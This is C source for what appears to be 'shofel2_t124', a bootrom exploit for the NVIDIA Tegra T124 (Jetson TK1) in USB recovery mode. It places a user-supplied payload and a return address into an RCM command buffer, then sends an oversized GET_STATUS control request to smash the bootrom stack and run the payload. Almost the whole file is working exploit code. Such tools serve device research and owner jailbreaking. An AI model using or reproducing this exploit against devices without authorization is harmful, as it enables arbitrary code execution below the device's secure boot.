#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include "mini_libusb.h"
#include "t124_rcm.h"


void print_hex_memory( void *mem, size_t size ) {
  uint8_t *p = (uint8_t *)mem;
  for ( int i = 0; i < size ; i++ ) {
    if ( ( ( i % 16 ) == 0 ) && i )
      printf( "\n" );
    printf( "0x%02x ", p[i] );
  }
  printf( "\n" );
}

int main( int argc, char *argv[] ) {

    int _ret_main = -1;

    if ( argc != 2 ) {
        fprintf( stderr, "Error: invalid argument count. shofel2_t124 payload.bin\n" );
        goto exit;
    }


  // ---- INIT RCM ----

    printf( "Waiting T124 to enter RCM mode (ctrl-c to cancel). Note: root permission could be required.\n" );
    int rcm_usb = usb_open_by_vid_pid( (uint16_t)JETSON_TK1_VID, (uint16_t)JETSON_TK1_PID, 1 );
    printf( "K1 in RCM mode connected.\n" );
    if ( rcm_usb < 0 ) {
        fprintf( stderr, "Error: Couldn't open the usb.\n" );
        goto exit;
    }

    uint8_t chip_id_buf[RCM_CHIP_ID_LEN];
    memset( &chip_id_buf, 0, sizeof(chip_id_buf) );

    int ret = usb_send_bulk_txn( rcm_usb, RCM_EP1_IN, RCM_CHIP_ID_LEN, chip_id_buf );
    if ( ret < 0 ) {
        fprintf( stderr, "Error: Couldn't read Chip ID. Please reset T124 in RCM mode again.\n" );
        goto exit;
    }
    printf( "Chip ID: " );
    print_hex_memory( chip_id_buf, RCM_CHIP_ID_LEN );

  //-----------------------


  // ---- SEND PAYLOAD ----

    uint8_t rcm_cmd_buf[RCM_CMD_BUF_LEN];
    memset( rcm_cmd_buf, 0x00, sizeof(rcm_cmd_buf) );
  
    const uint32_t rcm_cmd_len = RCM_CMD_LEN;
    const uint32_t payload_entry = RCM_CMD_PAYLOAD_ENTRY;

  // TODO: Use IRAM space after memcpy return pos. Anyway, probably 22KB are enought for mostly of the payloads...
    uint8_t payload_file_buf[MAX_PAYLOAD_FILE_SIZE];
    int payload_file_fd = open( argv[1], O_RDONLY );
    if ( payload_file_fd < 0 ) {
        fprintf( stderr, "Error: Couldn't open the payload file.\n" );
        goto exit;
    }
    struct stat payload_file_stat;
    fstat( payload_file_fd, &payload_file_stat );
    if ( payload_file_stat.st_size > MAX_PAYLOAD_FILE_SIZE ) {
        fprintf( stderr, "Error: Payload file exceeds max payload size: %d bytes.\n", MAX_PAYLOAD_FILE_SIZE );
        goto exit;
    }
    uint32_t n_bytes = read( payload_file_fd, payload_file_buf, MAX_PAYLOAD_FILE_SIZE );

    memcpy( rcm_cmd_buf, (uint8_t *)&rcm_cmd_len, 0x4 );
    memcpy( &rcm_cmd_buf[RCM_CMD_BUF_PAYLOAD_INIT_POS], payload_file_buf, n_bytes );
    memcpy( &rcm_cmd_buf[RCM_CMD_BUF_MEMCPY_RET_POS], (uint8_t *)&payload_entry, 0x4 );

    ret = usb_send_bulk_txn( rcm_usb, RCM_EP1_OUT, RCM_CMD_BUF_LEN, rcm_cmd_buf );
    if ( ret < 0 ) {
        printf( "Error: Couldn't send RCM CMD.\n" );
        goto exit;
    }

  //----------------------


  // ---- RUN EXPLOIT ----
  
    uint8_t data[BOOTROM_SMASH_LEN];
    ret = usb_send_control_txn( rcm_usb, USB_CTRL_DEVICE_ENDPOINT_TO_HOST,
            USB_CTRL_GET_STATUS, 0, 0, BOOTROM_SMASH_LEN, data );
    if ( ret == 0 ) {
        printf( "Error: Hacky Get Status finished correctly... Not cool :-(\n" );
        print_hex_memory( data, sizeof(data) );
        goto exit;
    }

    printf( "Hacky Get Status returned error... Probably the stack got smashed, Congrats :-)\n" );

    //----------------------

    _ret_main = 0;

exit:
    if ( rcm_usb > 0 ) usb_close( rcm_usb );
    if ( payload_file_fd > 0) close( payload_file_fd );
    return _ret_main;

}

